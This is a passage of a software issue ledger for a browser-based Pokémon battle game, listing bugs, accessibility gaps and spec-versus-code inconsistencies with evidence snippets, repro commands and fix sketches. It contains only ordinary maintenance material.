"Giratina":  { "godlygift": { "Wall": {"item": ["Leftovers", "No Item"], ...} } }
```

**Repro**: `node scripts/debug/data-validator.mjs` reports `[P1] 1 items referenced by builds are missing from items.json — No Item (11 build(s))`. Affects gen8.json (6) and gen9.json (5).

**Blast radius**: When `makeBuild` rolls a slot whose `item` array picks `"No Item"`, the mon's `item` becomes the literal string `"No Item"`. The engine handles this as a sentinel (`battle.html` lines 13134-13136 fall through to `'No Item'` as a default), so combat works. But: the tooltip dictionary populated from `items.json` has no entry, so any UI showing the mon's held item will not render a tooltip, and any code that does `itemsJSON[norm('No Item')]` for legality/effects gets `undefined` and may treat it as a missing entry.

**Fix sketch**: Either (a) add a single placeholder entry in `data/items.json` (gen 1, `name: "No Item"`, `shortDesc: "No held item."`) so consumers can look it up uniformly, or (b) migrate the 11 build slots to use `null` / omit the alternative entirely and document that "no held item" is encoded as absence rather than a sentinel string. Option (b) is more invasive but cleaner.

**Verification**: Re-run `node scripts/debug/data-validator.mjs`; the missing-items finding should drop to 0. Spot-check a build that previously had `"No Item"` in its item array (e.g., Vileplume `nu/Defensive`) and confirm the rolled mon gets the alternative held item when "No Item" was selected.

---

## <a id="ISSUE-075"></a> ISSUE-075: Battle log (#battle-log) only cleared on returnToHome, not at battle start; previous fight's lines bleed in

---
id: ISSUE-075
severity: P1
category: bug
anchor_symbol: returnToHome
current_line_hint: ~15237
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 308066024fc5
confidence: high
status: fixed-main
---

**Title**: Battle log (#battle-log) only cleared on returnToHome, not at battle start; previous fight's lines bleed in

**Evidence**:
```js
// The ONLY site that clears the battle log, and it lives in returnToHome (forfeit/menu return):
document.getElementById('draft-grid').innerHTML = ''; document.getElementById('battle-log').innerHTML = '';
```
The log is a DOM element (`#battle-log`, cached as `battleEls.battleLog`); `logMsg` (14640) only ever `appendChild`s a `<div>` per line and never wipes. `startBattle()` appends "Battle started!" (17237) on top of whatever was already there — it does not clear the log. The normal between-battle flow (victory → afterBattleReturn → processNextEvent → enterBattleEvent → launchBattle → startBattle) never passes through returnToHome, so consecutive Story battles accumulate one continuous log.

**Repro**: `node scripts/debug/_repro/log-bleed.mjs` — seed 3 lines ("Foe Mewtwo used Psystrike!", "BOSS IS PREPARING") into #battle-log, call startBattle() for fight 2, assert log still contains them: result "BATTLE LOG BLEEDS: YES". jsdom.

**Blast radius**: Every consecutive battle in a Story run (and any mode that reuses the persistent `state`/DOM without a returnToHome between fights). Purely a UI/log-correctness issue — no mechanical effect — but it is the "battle logs may do the same" the maintainer reported. On mobile the landscape cap (battleLogMaxEntries) hides the overflow; on desktop (cap 0 = unbounded) the prior fight's lines are visible at the top of the new fight.

**Fix sketch**: Clear the log at the start of every fight — e.g. in startBattle near the screen-battle reveal (~17072) add `const _lg = document.getElementById('battle-log'); if (_lg) _lg.innerHTML = '';` (or call a shared clearBattleLog() also used by returnToHome).

**Verification**: Re-run the repro; after startBattle the log must contain only the new fight's lines. Manually: win a Story battle, enter the next — the log starts empty.

---

## <a id="ISSUE-076"></a> ISSUE-076: showScreen() does no focus management on story-screen transitions — focus is orphaned

---
id: ISSUE-076
severity: P1
category: a11y
anchor_symbol: showScreen
current_line_hint: ~48565
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 00376bc90497
confidence: high
status: fixed-claude/relaxed-bell-2X3Ys
---

**Title**: showScreen() does no focus management on story-screen transitions — focus is orphaned

**Evidence**:
```js
function showScreen(id) {
    document.querySelectorAll('.screen,.modal').forEach(el=>el.classList.add('hidden'));
    const el = document.getElementById(id);
    if (el) el.classList.remove('hidden');
}
```

**Repro**: With a screen reader / keyboard, move between any story service screens (city → shop → professor → catch). The previously focused control gets `.hidden`; focus falls back to `<body>`, so SR users lose their place and keyboard users must re-Tab from the top of the document on every transition.

**Blast radius**: Every `#screen-story-*` navigation (15+ screens), plus the new daycare/hatch and Fight Club screens that will route through the same `showScreen`. Regions already carry `role="region" aria-label`, so the labeling exists — only focus delivery is missing.

**Fix sketch**: After unhiding, move focus to the new screen's heading or first interactive element (e.g. give the screen `tabindex="-1"` and `.focus()`, or focus its `h2/h3`). Optionally announce via an `aria-live` status.

**Verification**: SR announces the new screen's name/heading on each transition; keyboard Tab starts inside the new screen.

---

## <a id="ISSUE-077"></a> ISSUE-077: Mechanics-unlock docs still describe one-per-gym drip; code now unlocks all four at Colress/City 6

---
id: ISSUE-077
severity: P1
category: inconsistency
anchor_symbol: slotsUnlocked
current_line_hint: ~42749
file: battle.html
agents: [spec-drift-auditor]
fingerprint: b088e5373276
confidence: high
status: open
---

**Title**: Mechanics-unlock docs still describe one-per-gym drip; code now unlocks all four at Colress/City 6

**Evidence**:
```js
// battle.html ~42742 (also a mirror at ~38575 and dev-seeder at ~38702):
const slotsUnlocked = badges < 5 ? 0 : 4;          // ALL four at badges>=5
sm.unlockedGimmicks = order.slice(0, Math.min(slotsUnlocked, order.length));
// inline comment: "Previously these dripped one per gym (5->8) ... Unlock all
//                  four player battle mechanics together the moment ... Colress"
```
```text
docs/PROGRESSION_CURVE_MASTER.md:182 (marked "✅ verified live"):
  `slotsUnlocked = badges < 5 ? 0 : min(4, badges−4)`; order mega → dmax → tera → z.
:183  - Badges 1–4 = 0 · GL5→1 · GL6→2 · GL7→3 · GL8→4.
```

**Repro**: Win Gym 5 (badges→5) with all four mechanics enabled in run setup; `sm.unlockedGimmicks` is `['mega','dmax','tera','z']` immediately. The doc says only 1 slot should be open until GL8.

**Blast radius**: This is a doc-vs-code contradiction, not a code bug. Docs that must be updated to match the merged rule (`badges < 5 ? 0 : 4`):
- `docs/PROGRESSION_CURVE_MASTER.md` §2e line 182 (the `min(4, badges−4)` formula — and drop the "✅ verified live" tag, it is now false), line 183 (the `GL5→1 · GL6→2 · GL7→3 · GL8→4` enumeration), and line 181's stale anchor `battle.html:42146` (real sites are ~38575 and ~42749).
- `docs/PROGRESSION_CURVE_MASTER.md` master-timeline `Gmk` column: line 94 ("→ Badge 5 → FIRST GIMMICK SLOT"), line 95 (row idx 32 Gmk=1), line 96 (idx 33 Gmk=1), line 97 (idx 34 Gmk=1), line 101 (idx 38 "2 gimmick slots"), line 109 (idx 46 "3 gimmick slots"), line 116 (idx 53 "Badge 8 → 4 gimmick slots") — every `Gmk` cell for badges 5–7 should read 4, not 1/2/3.
- `docs/PROGRESSION_CURVE_MASTER.md` §3.1 F2 (line 230) and §3.3 line 204 still frame "gimmicks unlock at GL5 [singular] ... Colress debuts C6" — the count is now four-at-once, so the "holds one unusable unlock for one stage" framing should become "holds all four for one stage until Colress."
- `STORY_MODE_FLOW.md` §15d line 722-723 ("Cable Link only rolls gimmicks the player has unlocked **via gym victories**") reads as per-gym; soften to "unlocked at the Colress/Gym-5 gate."

Note also a minor code wart surfaced while verifying: the `?storychampionweak=1` dev seeder at ~38702 still uses `Math.min(8, order.length)` (stale `8`) instead of the `slotsUnlocked` rule; functionally equivalent for a maxed run (min(8,4)=4) but inconsistent with the two real sites.

This also OBSOLETES ledger `ISSUE-152` (P3, "DMax unlocks at Gym 5 instead of Gym 6 if Mega is off") — the new all-at-once rule means disabling a mechanic can no longer shift another's unlock gym. Verify-and-close, don't re-open.

**Fix sketch**: Docs-only. Update `PROGRESSION_CURVE_MASTER.md` §2e + the `Gmk` timeline column + §3.1 F2 to the "all four enabled gimmicks unlock together at badges>=5 (post-GL5), equippable at Colress/City 6" rule. Optionally clean the stale `8` in the dev seeder.

**Verification**: After doc edit, `grep -n "min(4, badges\|GL5→1\|FIRST GIMMICK SLOT" docs/PROGRESSION_CURVE_MASTER.md` returns nothing; the `Gmk` column shows 4 for every row with badges>=5.

---

## <a id="ISSUE-078"></a> ISSUE-078: Boss-mechanic hookup reads window.StoryMode.{BOSS_CONFIGS,bossMechanics*} but those live on test-only __storyTest — boss arc still dead in prod

---
id: ISSUE-078
severity: P1
category: bug
anchor_symbol: startBattle
current_line_hint: ~16832
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 3fdf16d5ab31
confidence: high
status: fixed-claude/cagedgod-excision
---

**Title**: Boss-mechanic hookup reads window.StoryMode.{BOSS_CONFIGS,bossMechanics*} but those live on test-only __storyTest — boss arc still dead in prod

**Evidence**:
```js
const _SM = (typeof window !== 'undefined' && window.StoryMode) || null;
const _bossCfgs = _SM && _SM.BOSS_CONFIGS;               // undefined at runtime
const _beatKey = _smState && _smState._activeBeatBattleKey;
const _cfg = _beatKey && _bossCfgs && typeof _bossCfgs === 'object' && _bossCfgs[_beatKey]; // always falsy
if (_cfg && Array.isArray(_cfg.mechanics) ...) {          // never entered
  if (typeof _SM.bossMechanicsBattleInit === 'function') ... // undefined
```

**Repro**: `node scripts/debug/_repro/boss-mech.mjs` — prints `StoryMode.BOSS_CONFIGS: undefined`, `bossMechanicsBattleInit: undefined`, `bossMechanicsTurnTick: undefined`. The keys exist only on `window.__storyTest` (battle.html:37602-37611), which is gated behind `if (window.__testHarness === true)` (37530) and never created in production. The real `window.StoryMode` return object (battle.html:~59564) has none of these keys. So `_cfg` is always undefined at 16836; `state._bossMechanics` (set only at 16839) is never set; the turn-tick at 20775 is skipped. Every villain/raid boss + Mystery Figure (main.mfBattle) fights as a vanilla battle with zero HP-threshold/immunity/field-lock mechanics.

**Blast radius**: All 19 BOSS_CONFIGS entries (10 villain bosses, 8 extra raids, Mystery Figure apex). The "just rerouted to window.StoryMode.*" change is the regression — it points the live battle path at an object that doesn't carry the symbols. Also disables the damage clamp at 23879 (gated on state._activeStoryBeatKey, set only inside the dead block at 16838).

**Fix sketch**: Move `BOSS_CONFIGS`, `bossMechanicsBattleInit`, `bossMechanicsTurnTick`, `showBossBanner` out of the `window.__storyTest` literal (37602-37611) and into the real StoryMode return object (~59564), OR have startBattle/turn-tick read `window.__storyTest` as a fallback. Verify `window.StoryMode.BOSS_CONFIGS` is truthy before claiming the path is live.

**Verification**: After fix, `node scripts/debug/_repro/boss-mech.mjs` must show all three `StoryMode.*` as non-undefined; then drive a main.mfBattle and confirm `state._bossMechanics` is populated and the immunity banner fires.

---

## <a id="ISSUE-079"></a> ISSUE-079: Boss/raid mechanics state never reset; bleeds into next ordinary Story fight

---
id: ISSUE-079
severity: P1
category: bug
anchor_symbol: startBattle
current_line_hint: ~17220
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 61d2b4386873
confidence: high
status: fixed-main
---

**Title**: Boss/raid mechanics state never reset; bleeds into next ordinary Story fight

**Evidence**:
```js
// startBattle() — the ONLY place these fields are written is inside this guard.
if (_cfg && Array.isArray(_cfg.mechanics) && _cfg.mechanics.length) {
    state._activeStoryBeatKey = _beatKey;
    state._bossMechanics = _cfg.mechanics.slice();
    state._bossMechanicsFired = {};
    state._bossPendingTelegraphs = [];
    state._bossSurgeTurns = 0;
    state._bossImmuneTurns = 0;   // <-- only set when THIS battle is a boss beat
}
```
`state` is the persistent module-level object (battle.html:14682 `let state = {...}`); startBattle() and launchBattle() MUTATE it, never replace it. The reset block at 17139-17189 clears weather/terrain/hazards/pSide/fSide/mega-dyna-tera but lists NONE of the `_boss*` fields. Unlike artifacts (which self-clear unconditionally in _storyApplyArtifacts, 54579+), the boss init is inside the `if (_cfg)` guard, so an ordinary (non-boss) beat never re-initialises or clears them. No `delete state._boss*` exists anywhere; onBattleEnd / afterBattleReturn / _handleCrucibleBattleEnd do not clear them either. The bled fields then arm the live damage hooks: surge +25% foe damage (24114) and immunity-round damage-to-0 (24375), and the turn-tick at 21168 re-runs because `state._bossMechanics.length` is still truthy.

**Repro**: `node scripts/debug/_repro/state-bleed.mjs` (boss fields survive into fight 2) and `node scripts/debug/_repro/boss-bleed-consequence.mjs` — CLEAN next fight: player Close Combat = 105 dmg; BLED next fight (`_activeStoryBeatKey`+`_bossImmuneTurns` left over): **0 dmg**, "braces — the attack does no damage!". Both jsdom, seed 0.

**Blast radius**: Any ordinary Story battle that immediately follows a boss/miniBoss/raid/miniRaid/Mystery-Figure fight (villain Road-6/7 climaxes, extra-track raids, mfBattle). Affects damage dealt by the player (immunity zeroes it) and by the foe (surge inflates it), plus stray boss banners re-firing. Persists across the whole rest of the run until another boss beat overwrites the fields (the next boss's init re-seeds them) — ordinary fights in between stay corrupted.

**Fix sketch**: In startBattle's reset block (alongside the weather/terrain reset at ~17148), unconditionally clear the boss fields before the `if (_cfg)` guard: set `state._activeStoryBeatKey = null; state._bossMechanics = []; state._bossMechanicsFired = {}; state._bossPendingTelegraphs = []; state._bossSurgeTurns = 0; state._bossImmuneTurns = 0; state._bossWeatherLocked = false; state._bossTerrainLocked = false;` — mirroring how _storyApplyArtifacts resets artifact flags every battle.

**Verification**: Re-run both repro scripts; bled fight must show 105 dmg (== clean) and no "braces" line. Add a jsdom regression: start a boss beat, end it, start an ordinary beat, assert all `state._boss*` are cleared.

---

## <a id="ISSUE-080"></a> ISSUE-080: Fresh run starts with 0 PokéBalls (spec says 5 at run start); 5 are gifted at first Mart instead

---
id: ISSUE-080
severity: P1
category: inconsistency
anchor_symbol: startNewRun
current_line_hint: ~39514
file: battle.html
agents: [spec-drift-auditor]
fingerprint: c634b39bd109
confidence: high
status: fixed-main
---

**Title**: Fresh run starts with 0 PokéBalls (spec says 5 at run start); 5 are gifted at first Mart instead

**Evidence**:
```js
// battle.html ~39514 — startNewRun() (the production New-Adventure path, via confirmTrainerAndStart)
balls: { poke: 0, great: 0, ultra: 0, master: 0 },
// battle.html ~40701 — the 5 balls are granted by the FIRST-MART tutorial onContinue, not at run start:
onContinue: function () { try { _storyGrantBundle({ pokeBall: 5 }); } catch (e) {} ... }
```

**Repro**: Read `confirmTrainerAndStart` (~38931) → `startNewRun` (~39441): a brand-new run's `sm.balls` is `{poke:0}`. The "+5 PokéBalls" comes only from the `firstMart` cold-open (~40698-40702) on first Pokémart visit. But STORY_MODE_FLOW.md §1 (line 30) "Start the run with 5 PokéBalls" and §10 (line 270) `balls: { poke: 5 } // starting balls` both describe a run-START grant. The only `poke:5` in code is `migrateStoryPreV15` (~35260), which fires for `_loadedVer < 15` saves only — never for a fresh run. NOTE: distinct from ledger ISSUE-287 (that is the pre-v15 *migration* shadowing case; this is the *fresh-run* + spec-mismatch case, and the migration code it cites has since been changed to set balls unconditionally).

**Blast radius**: (1) Spec drift hazard: an agent implementing FLOW §10 verbatim would seed `poke:5` in `startNewRun`'s defaults AND keep the Mart gift → 10 balls, double-granting. (2) Two in-code comments now lie: `_shouldFireCatchTutorialBeforeBattle` (~46940 "starting kit gives 5, so this is just a safety net") and `migrateStoryPreV15` (~35256 "defaults block pre-populates balls:{poke:0}"). (3) Latent gameplay edge: the post-intro catch-tutorial gate requires `totalBalls > 0` (~46943); the Pokémart at City0 is an *optional* hub action, so a player who reaches the intro rival without tapping the Mart has 0 balls and the catch tutorial silently no-ops.

**Fix sketch**: Pick the canonical model and align the other side. Either (a) update FLOW §1/§10 to "5 PokéBalls are gifted on first Pokémart visit (City 0), not at run start", and fix the two stale "starting kit gives 5" comments; or (b) move the 5-ball grant into `startNewRun` and drop the Mart `_storyGrantBundle({pokeBall:5})`. Balls are user-owned economy — flag for sign-off before changing the grant point.

**Verification**: A fresh run's `sm.balls.poke` and the spec agree on count and grant timing; the catch-tutorial gate cannot be reached with 0 balls (or the doc documents the Mart dependency).

---

## <a id="ISSUE-081"></a> ISSUE-081: Three mutually-incompatible story-narrative designs coexist; no doc is the single canon

---
id: ISSUE-081
severity: P1
category: inconsistency
anchor_symbol: STORY_EVENTS_RAW
current_line_hint: ~30583
file: STORY_MODE_FLOW.md
agents: [spec-drift-auditor]
fingerprint: 2499e3087f11
confidence: high
status: open
---

**Title**: Three mutually-incompatible story-narrative designs coexist; no doc is the single canon

**Evidence**:
```text
STORY_MODE_FLOW.md:7  "It supersedes the project's earlier story-mode design notes where they conflict."
  → §17 describes the 8-variant STORYLINE_VARIANTS registry + 7 Mystery Figure identities + Caged God.
docs/STORY_NARRATIVE_VARIANTS.md:7  "canonical design for the 8-storyline system" (8 variants, buried_alive/cartridge_self).
docs/story-design/STORY_3TRACK_IMPL_PLAN.md  Main/Villain/Extra tracks, STORY_SCENES, "The First", deletes the 7 identities.
docs/story-design/STORY_FLOW_AUDIT.md:35-44  "two design eras running at the same time" — both fire in one run.
```

**Repro**: Read STORY_MODE_FLOW.md §17/§14d, docs/STORY_NARRATIVE_VARIANTS.md §1-§7, and docs/story-design/STORY_3TRACK_IMPL_PLAN.md PR-1..PR-7. Each presents a different narrative spine as authoritative. Then `grep -cF "sm.tracks" battle.html` (=21) and `grep -n the_first battle.html` — the 3-track + "The First" path is the one actually wired (`_tryFireRoadStoryBeats` called at battle.html ~42905).

**Blast radius**: This is the merge-overhaul's central blocker. Anyone reading STORY_MODE_FLOW.md as "canon" (its own claim + CLAUDE.md citing it) gets the 8-variant/7-identity/Caged-God model, which is NOT what runs. CANONICAL-vs-SUPERSEDED verdict for the merge: live engine = 3-track (STORY_3TRACK_IMPL_PLAN, mostly shipped) + classic spine; STORY_FLOW_AUDIT §6 records the maintainer decision "Cut the 8-variant concept entirely." STORY_NARRATIVE_VARIANTS.md is SUPERSEDED in full; STORY_MODE_FLOW.md §17/§14d is STALE on the narrative layer.

**Fix sketch**: Pick the 3-track + classic-spine model as canon (it is what ships). Rewrite STORY_MODE_FLOW.md §17/§14d to describe `MAIN/VILLAIN/EXTRA_STORY_BEATS` + `the_first`; demote docs/STORY_NARRATIVE_VARIANTS.md to a SUPERSEDED banner (or delete); fold STORY_3TRACK_IMPL_PLAN.md's shipped-vs-pending status into the canon doc.

**Verification**: One doc (STORY_MODE_FLOW.md) describes exactly the narrative engine that `grep`-resolves in battle.html (`sm.tracks`, `STORY_SCENES`, `the_first`); no surviving doc claims 8 selectable variants or 7 Mystery identities.

---

## <a id="ISSUE-082"></a> ISSUE-082: Reaper's Toll uses bare IIFE-private `storyRngNext` — guard always false, breaks seeded replays

---
id: ISSUE-082
severity: P1
category: inconsistency
anchor_symbol: storyRngNext
current_line_hint: ~24081
file: battle.html
agents: [consistency-auditor]
fingerprint: 80dcfb8449c7
confidence: high
status: fixed-main
---

**Title**: Reaper's Toll uses bare IIFE-private `storyRngNext` — guard always false, breaks seeded replays

**Evidence**:
```js
// lines 24081 / 24089 / 24139 / 24147 (outside StoryMode IIFE)
const cursed = foeSurvivors[Math.floor((typeof storyRngNext !== 'undefined' ? storyRngNext() : Math.random()) * foeSurvivors.length)];
```

**Repro**: `storyRngNext` is declared only at line 31874 inside the StoryMode IIFE (no bare export). At battle-engine scope `typeof storyRngNext` is always `'undefined'`, so all four Reaper's Toll sites silently fall through to `Math.random()` even in a seeded story battle.

**Blast radius**: Same RNG-replay-drift class as the 11 `sm` sites already fixed. The "cursed survivor" pick diverges between an original story run and its seeded replay; story-replay.mjs determinism checks will not catch it because the branch never enters the seeded path.

**Fix sketch**: Use the script-top idiom already used 16x elsewhere: `(s && s.active && typeof window.storyRngNext === 'function') ? window.storyRngNext : Math.random` (or route through the new `storyAwareRng()` helper).

**Verification**: grep `typeof storyRngNext` in battle.html returns 0 outside-IIFE hits; replay a Reaper's Toll battle twice with same seed and confirm identical survivor weakened.

---

## <a id="ISSUE-083"></a> ISSUE-083: Pokémon Trader (STORY_FEATURES_INTEGRATION.md §7) at City4 still missing

---
id: ISSUE-083
severity: P1
category: inconsistency
anchor_symbol: traderOfferByCity
file: battle.html
agents: [spec-drift-auditor]
fingerprint: 5ccd1b40734e
confidence: high
status: wontfix-DE-SCOPED-permanent
---

**Title**: Pokémon Trader (STORY_FEATURES_INTEGRATION.md §7) at City4 still missing

**Evidence**:
```
$ grep -niE 'traderOffer|enterTrader|tradeMon|fixedTrade|cityTrader|traderHouse' battle.html
(no matches)
```

**Repro**: Visit City4 on first arrival (event idx 26) or post-gym (event idx 29) — no Trader NPC offers a same-grade fixed trade. Spec calls for a single City4 trader generating a 1:1 same-grade species swap, frozen on first generation, both species from enabled gens.

**Blast radius**: Smallest scope from the spec checklist (§17.6 — "half-day"), but still unshipped after 6+ months. Could land independently of itinerary / wager / black market.

**Fix sketch**: Add `sm.traderOfferByCity = {}` save field, `_generateTraderOffer(cityIdx, enabledGens)` near `_pickStarterPartner` (~36819), render the City4 Trader button alongside Safari Zone in `renderCityActions`.

**Verification**: Enter City4 on first visit; Trader NPC offers e.g. Ralts ↔ Riolu (both G2); accept swaps the party slot; revisit City4 — same frozen offer (or marked traded).

---

## <a id="ISSUE-084"></a> ISSUE-084: Speed-tie resolution + Quick Claw + lock-turn duration all use bare `Math.random()` in the turn loop

---
id: ISSUE-084
severity: P1
category: bug
anchor_symbol: turn-resolution
current_line_hint: ~19368
file: battle.html
agents: [consistency-auditor]
fingerprint: 91037ef383da
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Speed-tie resolution + Quick Claw + lock-turn duration all use bare `Math.random()` in the turn loop

**Evidence**:
```js
// L19353-19354 (Quick Claw — should be deterministic in story)
if (_pItemActiveQC && state.pActive.item === "Quick Claw" && Math.random() < 0.2) { pPri += 0.4; ... }
if (_fItemActiveQC && state.fActive.item === "Quick Claw" && Math.random() < 0.2) { fPri += 0.4; ... }
// L19368 (speed tie)
else if (fSpe === pSpe) pGoesFirst = Math.random() > 0.5;
// L19762 (locking move turn count — Outrage/Thrash/Petal Dance)
attacker.volatile.lockTurns = 1 + Math.floor(Math.random() * 2);
// L20077 (Sleep Talk picks a random move)
let sleepTalkPick = validMoves[Math.floor(Math.random() * validMoves.length)];
```

**Repro**: Story battle, seed it, give the foe a Quick-Claw holder. Two replays of the same seeded turn will not see the same Quick-Claw procs. Speed-tie between two mons with the same Speed: ditto.

**Blast radius**: Order-of-actions is the highest-leverage RNG in the engine — first-strike flips entire battles. Speed-tie and lock-turn divergence propagate through the rest of the run.

**Fix sketch**: At the top of the turn-resolution closure that owns these branches, bind `_rng = (sm && sm.active) ? storyRngNext : Math.random` and use it for every priority/turn-count decision. Lock-turn count and Sleep Talk picks should also be on `_rng`.

**Verification**: Seeded replay where both sides field equal-Speed mons; assert action order matches across runs. Quick-Claw-holder seeded fight: assert proc/no-proc parity.

---

## <a id="ISSUE-085"></a> ISSUE-085: `???` type used by gen1 `bide` and gen4 `curse` is not defined in `typeChart`

---
id: ISSUE-085
severity: P1
category: data
anchor_symbol: typeChart
current_line_hint: ~9941
file: battle.html
agents: [data-integrity-auditor]
fingerprint: 72e49ce309b5
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `???` type used by gen1 `bide` and gen4 `curse` is not defined in `typeChart`

**Evidence**:
```js
// battle.html ~9941
const typeChart={"Normal":{...},"Fire":{...}, ... /* 18 entries, no "???" */};

// data/moves.json gen4.curse
{ "type": "???", "desc": "If the user is not a Ghost type, lowers Speed by 1 stage ..." }
```

**Repro**: `node -e "const moves=JSON.parse(require('fs').readFileSync('/home/user/battle/data/moves.json','utf8')); for (const g of Object.keys(moves)) for (const k of Object.keys(moves[g])) if (moves[g][k].type==='???') console.log(g,k);"` prints `1 bide` and `4 curse`. Grep the typeChart literal: `???` is absent.

**Blast radius**: The live engine only loads gen9 moves (`movesJSONOrig['9']`), where `curse` is `Ghost` and `bide` is `Normal`, so today the runtime never observes a `???` type. However, any tooling that reads earlier gens from `moves.json` (e.g., a dex/format browser, a learnset preview that walks the inheritance chain) will look up `typeChart["???"]` and receive `undefined`, causing all subsequent damage-multiplier math to fall back to `1` silently. This is also a load-bearing assumption for any future gen-toggle feature.

**Fix sketch**: Either remove the gen4 `curse.type === "???"` data (replacing it with the Showdown-canonical `Normal` typing it had in gen4) or add a `"???"` entry to `typeChart` with all neutral (`1×`) effectiveness so legacy-data consumers don't get `undefined`. The first option matches engine behavior; the second preserves the original Showdown export verbatim.

**Verification**: After the fix, `Object.keys(typeChart).includes('???')` is true (option B) or `moves.json` has no `???` types (option A). Either way, `node scripts/debug/data-validator.mjs` should pass without warnings about the typeless move.

---

## <a id="ISSUE-086"></a> ISSUE-086: Turn-resolution catch masks any in-loop throw as "[Error: …. Turn skipped.]" — both moves abandoned, real bugs hidden (PT-001)

---
id: ISSUE-086
severity: P2
category: bug
anchor_symbol: __runLockedPvPTurnResolution
current_line_hint: ~21100
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 06c1239b57d5
confidence: medium
status: open
---

**Title**: Turn-resolution catch masks any in-loop throw as "[Error: …. Turn skipped.]" — both moves abandoned, real bugs hidden (PT-001)

**Evidence**:
```js
} catch(err) {
    console.error("Battle error:", err);
    try { logMsg(`[Error: ${err && err.message ? err.message : err}. Turn skipped.]`, 'dmg'); } catch (e) {}
    state.isLocked = false;
    ...
```

**Repro**: Scenario-level. The big try at battle.html:~20765 wraps the entire turn body (priority resolution, performAction, endOfTurnEffects, tickWeather, checkFaints) plus two unguarded `await anime({...}).finished` faint animations at 20897/20916 that only run when `settings.animations` is true (so the jsdom harness, which disables animations, can't reproduce). Any throw — a null-deref in a move handler, an anime promise rejection, a malformed move object — is swallowed and surfaced to the player as a benign-looking "Turn skipped", with the player's selected move and the foe's move both partially/fully discarded. Masks wrong-result and softlock-adjacent bugs as a one-line log.

**Blast radius**: Entire turn loop. This is a diagnosability hole more than a standalone bug; it converts real engine exceptions into silent mid-battle turn loss. Suspected home of intermittent "my move didn't go off" reports.

**Fix sketch**: Wrap the two `await anime(...).finished` faint calls (20897, 20916) in try/catch (they are the most likely in-loop throwers under live animations). Separately, on catch, surface a debug breadcrumb (err.stack to a ring buffer / `state._lastTurnError`) so QA can distinguish "intended skip" from "engine threw". Do not silently drop the turn without recording why.

**Verification**: Force a throw inside performAction under `settings.animations=true` and confirm the turn still completes (faint anim failure no longer aborts the turn) and that `state._lastTurnError` captures the stack.

---

## <a id="ISSUE-087"></a> ISSUE-087: ~250-line Caged God boss arc is dead code (unreachable) but still fully shipped

---
id: ISSUE-087
severity: P2
category: refactor
anchor_symbol: _bossArcRenderSection
current_line_hint: ~49285
file: battle.html
agents: [consistency-auditor]
fingerprint: 19bef76fa998
confidence: high
status: fixed-claude/cagedgod-excision
---

**Title**: ~250-line Caged God boss arc is dead code (unreachable) but still fully shipped

**Evidence**:
```js
function _bossArcRenderSection(hubMode) {
    _bossArcEnsureState();
    if (!sm.bossArc.available || sm.bossArc.cleared) return '';  // available is always false
    ...
}
// Live, never-callable: _bossArcRenderSection, bossEnterCage, bossCollectLead,
// bossAttack, bossRetreatToCity, _bossArcRollLegendary, _bossArcCheckCageUnlock,
// _BOSS_LEAD_FLAVOR, _BOSS_LEAD_FLAVOR_BY_VARIANT (8 variant blocks),
// _SUBJECT_ZERO_EPILOGUE_BY_VARIANT, _variantSubjectZeroEpilogue.
```

**Repro**: Same root cause as the P1 — `available` never true. The whole arc + its 8 per-variant flavor pools + the `Subject Zero` epilogue are authored, wired, and unreachable.

**Blast radius**: Maintenance confusion ("which post-game is live?"). CLAUDE.md says the Caged God arc "was just removed," but only the *save state* (migrateStoryPreV24) and the *trigger* were removed; the implementation, UI strings, achievements, and dialogue pools remain. This is precisely the "which one is live" ambiguity flagged as the top concern.

**Fix sketch**: Decide: either (a) delete the Caged-God island wholesale (arc fns, `_BOSS_LEAD_*`, Subject-Zero epilogue, achievements `caged_god`/`r_caged_god`, intro-screen copy at ~11337/11360), or (b) re-enable it by setting `bossArc.available` at HoF. Do NOT leave both the "cut" comments and the live code coexisting.

**Verification**: grep `bossArc|Caged God|Subject Zero` returns only intentional survivors after the decision.

---

## <a id="ISSUE-088"></a> ISSUE-088: Caged God lead spec (§9 "visit Cities 2/5/8") contradicts shipped Crucible-hub collection; §14b omits the arc

---
id: ISSUE-088
severity: P2
category: inconsistency
anchor_symbol: _bossArcRenderSection
current_line_hint: ~48539
file: battle.html
agents: [spec-drift-auditor]
fingerprint: e2a51b657ed3
confidence: high
status: fixed-claude/cagedgod-excision
---

**Title**: Caged God lead spec (§9 "visit Cities 2/5/8") contradicts shipped Crucible-hub collection; §14b omits the arc

**Evidence**:
```js
// battle.html ~48566 — Crucible hub-mode path (the fix)
if (hubMode && !allLeads) {
    // Crucible hub = the post-game Underground: the whole broker network is
    // reachable here, so any uncollected lead can be pulled …
    for (const k of ['ledger', 'recording', 'key']) { if (L[k]) continue; … bossCollectLead … }
} else if (localLeadKey && !L[localLeadKey]) { /* only fires at physical city 2/5/8 */ }
```

**Repro**: STORY_MODE_FLOW.md §9 (line 229) says the player "must visit three corrupted Pokémon Centers in any order." But `continuePostGame` (~53510) and `leaveCrucible` (~48079) both snap `sm.eventIndex` to `lastStoryCityEventIndexAtOrBefore()` — after Champion that's City 9. There is no post-game free travel to Cities 2/5/8, so the in-city `localLeadKey` path (~48576) is unreachable post-HoF. Leads are collectable ONLY via the Crucible `hubMode` path (line 48102) — a real fix the spec never documents.

**Blast radius**: A reader following FLOW §9 literally would conclude the Caged God is unreachable (it was, pre-fix). §14b's Crucible facilities list (FLOW lines 446–450) enumerates Battle Frontier/Mystery/Rival/League/Gym/Wild + facilities but never mentions the Caged God hunt, even though it now renders at the very top of the Crucible (`_renderCrucible`, line 48104, "Post-Game Quest").

**Fix sketch**: Update FLOW §9 to state leads are collected from the Crucible's "Post-Game Quest" block (the 3-city framing survives only as label flavor), and add a "Caged God — Post-Game Quest" line to the §14b Crucible screen inventory. Note that the in-city path is dead post-HoF.

**Verification**: Spec §9/§14b describe the Crucible as the lead-collection surface; the dead in-city branch is either removed or documented as pre-HoF-only.

---

## <a id="ISSUE-089"></a> ISSUE-089: Post-game lead "hunt" collapses to 3 buttons on one Crucible screen — no travel, no gating

---
id: ISSUE-089
severity: P2
category: design
anchor_symbol: _bossArcRenderSection
current_line_hint: ~48566
file: battle.html
agents: [story-mode-investigator]
fingerprint: 7de2a5226091
confidence: high
status: fixed-claude/cagedgod-excision
---

